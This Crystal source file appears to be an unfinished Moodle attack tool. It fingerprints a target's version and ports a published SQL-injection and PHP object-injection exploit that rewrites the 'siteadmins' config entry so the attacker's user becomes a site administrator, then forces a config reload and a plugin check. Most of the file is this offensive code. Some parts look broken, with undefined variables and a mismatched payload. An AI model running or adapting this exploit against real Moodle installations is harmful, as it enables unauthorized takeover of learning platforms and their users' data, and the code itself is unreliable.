# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"

module Toodlemoodle
  class Main
    VERSION = "0.1.0"
    @scan = false
    @target = ""
    @destination = ""

    def parser_config(parser)
      parser.banner = "Usage: tmoodle [arguments] TARGET"
      parser.on("-s", "--scan", "Scans the target (default)") { @scan = true }
      parser.on("-t NAME", "--to=NAME", "Specifies the name to target (ignore, for ref)") { |name| @destination = name }
      parser.on("-h", "--help", "Show this help") { puts parser }
      parser.invalid_option do |flag|
        STDERR.puts "ERROR: #{flag} is not a valid option.\n"
        STDERR.puts parser
        exit(1)
      end
      parser.unknown_args do |args|
        @target = args[0]
      end
    end

    def main
      OptionParser.parse! do |parser|
        parser_config(parser)
      end

      if !@target
        STDERR.puts "ERROR: Please specify a target.\n"
        exit(1)
      else
        puts "Attacking #{@target}!"
        version_regex = /(?:(\d+)\.)?(?:(\d+)\.)?(\d+)/

        # TODO: Put your code here
        params = HTTP::Params.encode({"author" => "John Doe", "offset" => "20"}) # => author=John+Doe&offset=20
        response = HTTP::Client.get "https://#{@target}/lib/upgrade.txt"         # https://ole.unibz.it
        # puts response.body
        if regex_data = response.body.match(version_regex)
          puts "Version #{regex_data.not_nil![0]} detected." # => 200
        end
      end
    end
  end

  main = Main.new
  main.main

  class SqlInjection
    # This exploit is a Crystal implementation by Claudio Spiess of the original
    # PHP version by Marko Belzetski. Many thanks.
    # From https://www.exploit-db.com/exploits/41828
    def http_post(url, data, moodle_session, json : Boolean)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      if json
        headers.add("Content-Type", "application/json")
      else
        data = HTTP::Params.encode(data)
      end

      # post
      return HTTP::Client.post(url, headers: headers, body: data).body
    end

    def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      return HTTP::Client.get(url, headers: headers).body
    end

    def update_table(url, moodle_session, sess_key, table, row_id, column, value)
      # first we create a gradereport_overview_external object because it is
      # supported by the Moodle autoloader and it includes the grade_grade and
      # grade_item classes that we are going to need
      # below is a serialized PHP object
      value = "a:2:{i:0;a:1:{" \
              "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
              "i:1;O:40:\"gradereport_singleview\\local\\u\\feedback\":1:{" \
              "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
              "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
              "s:11:\"calculation\";" \
              "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
              "s:5:\"table\";s:#{table_name_length}:\"#{table_name}\";" \
              "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column_name}\";" \
              "i:#{value};s:8:\"d_fields\";a:2:{" \
              "i:0;s:#{column_name_length}:\"#{column_name}\";i:1;s:2:\"id\";}}}}};"

      #   we"ll set the course_blocks sortorder to 0 so we default to legacy user preference
      data = {"sesskey" => sess_key, "sortorder[]" => 0}
      http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false)
      #    injecting the payload

      # be hold the most beautiful json builder. can be parsed by regex (end)*
      string = JSON.build do |json|
        json.array do
          json.object do
            json.field "index", 0
            json.field "methodname", "core_user_update_user_preferences"
            json.field "args" do
              json.object do
                json.field "preferences" do
                  json.array do
                    json.object do
                      json.field "type", "course_overview_course_order"
                      json.field "value", value
                    end
                  end
                end
              end
            end
          end
        end
      end

      puts string

      #     httpPost($url..$sesskey, $data, $MoodleSession,1);
      http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", data, moodle_session, true)

      #     getting the frontpage so the payload will activate
      http_get(url + "/my/", moodle_session)
    end

    def execute
      url = ""            # url of Moodle
      moodle_session = "" # session cookie
      sess_key = ""       # sesskey (in url)

      # write js to extract this and make attack easier

      table = "config" # table to update
      row_id = 25      # row id to insert into. 25 is the row that sets the "siteadmins" parameter. could vary from installation to installation
      column = "value" # column name to update, which holds the userid
      value = 3        # userid to set as "siteadmins" Probably want to make it your own

      update_table(url, moodle_session, sess_key, table, row_id, column, value)

      row_id = 375 # row id of "allversionshash" parameter
      # reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
      sha_hash = Digest::SHA1.hexdigest(Time.utc_now.to_unix.to_s)
      update_table(url, moodle_session, sess_key, table, row_id, column, sha_hash)

      # reset the sortorder so we can see the front page again without the payload triggering
      data = {"sesskey" => sess_key, "sortorder[]" => 1}
      http_post(url + "/blocks/course_overview/save.php", data, moodle_session, 0)

      # force plugincheck so we can access admin panel
      http_get(url + "/admin/index.php?cache=0&confirmplugincheck=1", moodle_session)
    end
  end
end
